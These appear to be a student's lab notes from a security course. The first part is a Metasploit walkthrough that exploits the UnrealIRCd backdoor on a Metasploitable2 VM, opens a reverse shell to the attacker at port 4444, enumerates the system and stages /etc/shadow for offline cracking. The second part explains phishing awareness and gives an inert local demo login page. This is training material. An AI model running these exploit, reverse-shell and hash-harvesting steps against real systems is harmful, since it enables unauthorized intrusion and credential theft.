Step 2 — Exploitation, Reverse Shell, Post-Exploitation

Objective: exploit a known vulnerability on Metasploitable2, obtain an interactive shell on the target (reverse shell), and perform post-exploit enumeration and credential collection for analysis.

A — Theory (what this phase is and why)

Exploit: use a known vulnerability in a network service to run arbitrary code on the target. In this lab we used the UnrealIRCd 3.2.8.1 backdoor exploit (exploit/unix/irc/unreal_ircd_3281_backdoor). The exploit abuses a backdoor command to execute shell commands remotely.

Payload / Reverse shell: a reverse shell payload makes the target connect back to the attacker (LHOST:LPORT). The attacker runs a listener (Metasploit’s handler or nc) and the target opens a TCP connection to it which gives an interactive shell on the target.

Post-exploitation: once a shell exists, enumerate system info, running services, users, and collect sensitive artifacts (e.g., /etc/shadow) for offline analysis. Meterpreter provides sysinfo and hashdump convenience commands; on a plain shell you use uname -a, cat /etc/os-release and read /etc/shadow.

B — What you did (concise mapping of commands → purpose)

use exploit/unix/irc/unreal_ircd_3281_backdoor
→ selected the exploit module that targets UnrealIRCd backdoor.

set RHOST 192.168.56.101, set RPORT 6667
→ target address and IRC port.

set PAYLOAD cmd/unix/reverse, set LHOST 192.168.56.102, set LPORT 4444
→ chose a reverse shell payload that causes the target to connect back to Kali at 192.168.56.102:4444.

set ExitOnSession false , set VERBOSE true , exploit
→ keep msfconsole running after session opens and show verbose output. exploit launches the attack; Metasploit started the handler and the target connected back.

Metasploit printed:

Command shell session 2 opened (192.168.56.102:4444 -> 192.168.56.101:60350)


→ this confirms a reverse shell was established.

background (or used sessions to manage sessions)
→ backgrounded the session so msfconsole could still be used; then sessions -i 2 / sessions 2 to interact.

Post-exploitation commands (ran on the target shell):

whoami → current user (result: root)

id → uid/gid (confirmed root privileges)

uname -a → kernel and system info (equivalent to sysinfo in meterpreter)

cat /etc/issue or cat /etc/os-release → distribution info

hostname, pwd, ls -la / → basic environment and location info

ip a (or ifconfig -a) → network interfaces / IPs

netstat -tulpn (or ss -tulpn) → listening services and their PIDs

ps aux | head -n 30 → running processes

cp /etc/shadow /tmp/shadow.txt and cp /etc/passwd /tmp/passwd.txt → prepared credential files for transfer (this is the shell equivalent of meterpreter hashdump)

head -n 20 /etc/shadow (or /tmp/shadow.txt)
→ preview of password hash entries (you captured this for evidence).

C — Why sysinfo / hashdump didn’t work

sysinfo and hashdump are meterpreter commands. You used a plain command shell payload (cmd/unix/reverse), not meterpreter, so you must run native shell commands instead:

sysinfo ≈ uname -a, cat /etc/os-release, hostname

hashdump ≈ reading /etc/shadow (requires root); then transfer to attacker for offline cracking
Step3 - What is phishing?
Phishing is a type of social-engineering attack where attackers send fake emails or make fake web pages to trick people into giving secrets (passwords, OTPs, personal info) or clicking malicious links.

Common phishing types:

Email phishing: fake emails that look like they’re from banks, services, or colleagues.

Spear phishing: targeted to a specific person with personal details.

Clone-site phishing: a fake login page that looks like the real site.

Smishing / Vishing: SMS or voice-based phishing.

How phishing works (simple flow):

Attacker crafts a convincing message (subject, sender spoofing, urgent tone).

Message contains a link or attachment.

Victim clicks link → fake site or malware.

Victim enters credentials or runs malware → attacker gets access.

Phishing indicators (what to teach people to spot):

Sender address doesn’t match the legitimate domain (hover and examine full address).

Strange or urgent language: “Act now” / “Verify immediately”.

Links that don’t match visible text (hover to preview URL).

Poor spelling/grammar, wrong logos, or odd formatting.

Unexpected attachments or requests for credentials/MFA codes.

Emails that ask to bypass normal procedures (pay, transfer, share secrets).

Goals of a phishing simulation (training, not punishment):

Teach people to recognize suspicious messages.

Encourage the habit of hovering links and verifying sender.

Teach reporting: how and where to report suspected phishing.

Measure improvement: click rate, report rate, and time-to-report over repeated exercises.

Ethics & rules (must include in notes):

Always get written authorization before running any simulated campaign.

Use non-sensitive and clearly labelled simulations (e.g., “SIMULATION — DO NOT ENTER REAL CREDENTIALS”).

Provide immediate feedback and short training when someone falls for the simulation.

Avoid embarrassing or punitive traps — focus on learning.

Simple training message to show after a simulated click:
“Training notice: this was a safe phishing simulation. 

Metrics to record (notes):

Click rate (% of recipients who clicked the simulated link).

Report rate (% who reported the email).

Time-to-report (how quickly they reported).

Repeat results over time to measure improvement.

Commands (terminal commands, with one-line explanation each)

These commands are safe for local classroom demos. Never run real campaigns without permission. Always label the demo page clearly “SIMULATION — DO NOT ENTER REAL CREDENTIALS.”

1) Create project folder and add the demo HTML (Linux / macOS)
mkdir -p ~/phish-sim
cd ~/phish-sim


(Create a folder and move into it.)

Create the demo page (here-doc will create index.html):

cat > index.html <<'EOF'
<!doctype html>
<!-- SIMULATION — DO NOT ENTER REAL CREDENTIALS -->
<html><body><h1>SIMULATION — Login</h1>
<p>This is a training page. Do not enter real credentials.</p>
<form onsubmit="alert('Training: report suspicious messages.'); return false;">
  <input placeholder="email"><br><input placeholder="password" type="password"><br>
  <button type="submit">Login</button>
</form>
</body></html>
EOF


(This writes a simple, harmless HTML file. The form does not submit anywhere — it just shows a training alert.)

2) Serve the page locally (Python quick server)
# start the server on port 8000
python3 -m http.server 8000


(Open http://localhost:8000 in a browser to view the page. Stop server with Ctrl+C.)

Check server is running (from another terminal):

curl -I http://localhost:8000
The demo page will be dispalyed whre user can enter email and password so that user can get training about how phishing email occurs.

Step 


